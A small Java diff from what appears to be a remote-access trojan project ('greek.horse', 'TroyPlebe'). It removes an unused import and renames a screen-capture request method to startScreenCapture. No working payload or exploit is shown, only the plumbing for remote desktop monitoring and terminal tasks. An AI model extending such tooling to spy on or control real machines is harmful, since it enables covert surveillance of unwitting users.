@@ -4,7 +4,6 @@ import greek.horse.models.*;
 import greek.horse.server.troyStructure.request.RecurrentTroyRequest;
 import greek.horse.server.troyStructure.request.TroyRequest;
 import greek.horse.server.troyStructure.request.UniqueTroyRequest;
-import greek.horse.server.ui.controllers.HorseController;
 import greek.horse.server.ui.controllers.tasks.ChatTask;
 import greek.horse.server.ui.controllers.tasks.MonitorDesktopTask;
 import greek.horse.server.ui.controllers.tasks.TerminalTask;
@@ -71,7 +70,7 @@ public class TroyPlebe {
         requests.add(req);
     }
 
-    public RecurrentTroyRequest getScreenCapture(MonitorDesktopWrapper wrapper) {
+    public RecurrentTroyRequest startScreenCapture(MonitorDesktopWrapper wrapper) {
         RecurrentTroyRequest req = new RecurrentTroyRequest(wrapper, RequestFunction.DESKTOP_START);
         requests.add(req);
         return req;
